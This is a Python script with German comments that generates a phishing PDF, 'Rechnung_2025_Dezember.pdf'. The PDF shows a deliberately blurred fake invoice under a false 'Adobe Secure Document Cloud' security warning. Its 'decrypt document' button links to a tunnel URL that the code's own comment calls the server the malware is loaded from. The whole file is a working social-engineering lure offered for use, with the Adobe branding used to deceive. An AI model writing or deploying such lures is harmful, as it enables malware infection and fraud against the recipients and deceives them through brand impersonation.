import os
from fpdf import FPDF
from PIL import Image, ImageDraw, ImageFont, ImageFilter

# URL des Servers, von dem die Malware geladen werden soll
PAYLOAD_URL = "https://pxyea-90-186-43-205.a.free.pinggy.link/dokument_abrufen"
OUTPUT_FILENAME = "Rechnung_2025_Dezember.pdf"


def create_blurred_invoice_image(filename="temp_invoice.png"):
    """
    Erstellt ein Fake-Rechnungsbild und wendet einen Weichzeichner an.
    """
    # A4 Größe bei 100 DPI (ca. 800x1100 px)
    width, height = 827, 1169
    background_color = (255, 255, 255)  # Weiß

    img = Image.new("RGB", (width, height), background_color)
    draw = ImageDraw.Draw(img)

    try:
        font_header = ImageFont.truetype("arial.ttf", 40)
        font_bold = ImageFont.truetype("arialbd.ttf", 20)
        font_text = ImageFont.truetype("arial.ttf", 16)
    except IOError:
        font_header = ImageFont.load_default()
        font_bold = ImageFont.load_default()
        font_text = ImageFont.load_default()

    # Header (Logo Bereich & Firmenname)
    draw.rectangle(
        [(50, 50), (150, 150)], fill=(50, 50, 150)
    )  # Fake Logo (Blaues Quadrat)
    draw.text((170, 60), "Unternehmensberatung GmbH", fill=(0, 0, 0), font=font_header)
    draw.text(
        (170, 110),
        "Musterstraße 123, 10115 Berlin",
        fill=(100, 100, 100),
        font=font_text,
    )

    # Empfänger & Datum
    draw.text((50, 250), "An:", fill=(0, 0, 0), font=font_bold)
    draw.text(
        (50, 280),
        "Max Mustermann\nZielabteilung\nFirmenzentrale",
        fill=(0, 0, 0),
        font=font_text,
    )

    draw.text((550, 250), "Rechnungs-Nr: 2025-8492", fill=(0, 0, 0), font=font_text)
    draw.text((550, 280), "Datum: 30.12.2025", fill=(0, 0, 0), font=font_text)

    # Tabelle (Kopfzeile)
    draw.rectangle([(50, 400), (777, 440)], fill=(230, 230, 230))
    draw.text((60, 410), "Beschreibung", fill=(0, 0, 0), font=font_bold)
    draw.text((500, 410), "Menge", fill=(0, 0, 0), font=font_bold)
    draw.text((600, 410), "Einzelpreis", fill=(0, 0, 0), font=font_bold)
    draw.text((700, 410), "Gesamt", fill=(0, 0, 0), font=font_bold)

    # Tabelleninhalt (Fake Positionen)
    y = 460
    items = [
        ("Q4 Sicherheitsaudit - Dienstleistung", "1", "2.400,00 €", "2.400,00 €"),
        ("Server Wartung Dezember", "10 Std", "120,00 €", "1.200,00 €"),
        ("Software Lizenzen 2025 (Verlängerung)", "5", "800,00 €", "4.000,00 €"),
        ("Reisekostenpauschale", "1", "450,00 €", "450,00 €"),
    ]

    for item in items:
        draw.text((60, y), item[0], fill=(50, 50, 50), font=font_text)
        draw.text((500, y), item[1], fill=(50, 50, 50), font=font_text)
        draw.text((600, y), item[2], fill=(50, 50, 50), font=font_text)
        draw.text((700, y), item[3], fill=(50, 50, 50), font=font_text)
        draw.line([(50, y + 30), (777, y + 30)], fill=(200, 200, 200), width=1)
        y += 50

    # Summe (Groß und Rot)
    draw.text((550, y + 50), "Netto:", fill=(0, 0, 0), font=font_text)
    draw.text((700, y + 50), "8.050,00 €", fill=(0, 0, 0), font=font_text)

    draw.text((550, y + 80), "MwSt (19%):", fill=(0, 0, 0), font=font_text)
    draw.text((700, y + 80), "1.529,50 €", fill=(0, 0, 0), font=font_text)

    draw.line([(550, y + 110), (777, y + 110)], fill=(0, 0, 0), width=2)

    draw.text((550, y + 120), "GESAMTBETRAG:", fill=(0, 0, 0), font=font_bold)
    draw.text((700, y + 120), "9.579,50 €", fill=(200, 0, 0), font=font_header)  # Rot

    # Radius 5-8 macht Text unlesbar, aber Struktur erkennbar
    blurred_img = img.filter(ImageFilter.GaussianBlur(radius=4))
    blurred_img.save(filename)
    return filename


class PhishingPDF(FPDF):
    def overlay_box(self):
        """
        Erstellt die 'Sicherheitswarnung' über dem Bild
        """
        # Weiße Box mit Schatten (simuliert) - Halbtransparent ist in FPDF schwer,
        # wir nehmen eine solide Box, die in der Mitte schwebt.

        # Zentrierte Box
        self.set_fill_color(255, 255, 255)
        self.set_draw_color(200, 0, 0)  # Roter Rand
        self.set_line_width(1)

        box_w = 160
        box_h = 80
        box_x = (210 - box_w) / 2
        box_y = (297 - box_h) / 2 - 20  # Etwas weiter oben

        self.rect(box_x, box_y, box_w, box_h, "DF")

        # Icon / Warnung Text
        self.set_xy(box_x, box_y + 10)
        self.set_font("Arial", "B", 16)
        self.set_text_color(200, 0, 0)
        self.cell(box_w, 10, "SICHERHEITSHINWEIS", 0, 1, "C")

        self.set_xy(box_x + 10, box_y + 25)
        self.set_font("Arial", "", 11)
        self.set_text_color(50, 50, 50)
        self.multi_cell(
            box_w - 20,
            6,
            "Dieses Dokument ist durch Adobe Secure Document Cloud geschützt.\n"
            "Aufgrund sensibler Finanzdaten (DSGVO) wird der Inhalt verschlüsselt dargestellt.",
            0,
            "C",
        )

        # Button Style
        btn_w = 100
        btn_h = 15
        btn_x = (210 - btn_w) / 2
        btn_y = box_y + 55

        self.set_fill_color(0, 102, 204)  # Blau
        self.rect(btn_x, btn_y, btn_w, btn_h, "F")

        # Link über den Button
        self.set_xy(btn_x, btn_y + 3)
        self.set_font("Arial", "B", 12)
        self.set_text_color(255, 255, 255)
        self.cell(btn_w, 10, "DOKUMENT ENTSCHLÜSSELN", 0, 1, "C", link=PAYLOAD_URL)


def generate_pdf():
    # Bild erstellen
    print("[*] Generiere Fake-Rechnung...")
    img_path = create_blurred_invoice_image()

    # PDF erstellen
    print("[*] Erstelle PDF Overlay...")
    pdf = PhishingPDF()
    pdf.add_page()

    # Hintergrundbild (Das unscharfe Bild)
    # A4 = 210mm breit
    pdf.image(img_path, x=0, y=0, w=210)

    # Layer darüberlegen
    pdf.overlay_box()

    # Speichern
    pdf.output(OUTPUT_FILENAME)
    print(f"[+] PDF erfolgreich erstellt: {OUTPUT_FILENAME}")
    print(f"[+] Link zeigt auf: {PAYLOAD_URL}")

    # Cleanup
    if os.path.exists(img_path):
        os.remove(img_path)


if __name__ == "__main__":
    generate_pdf()
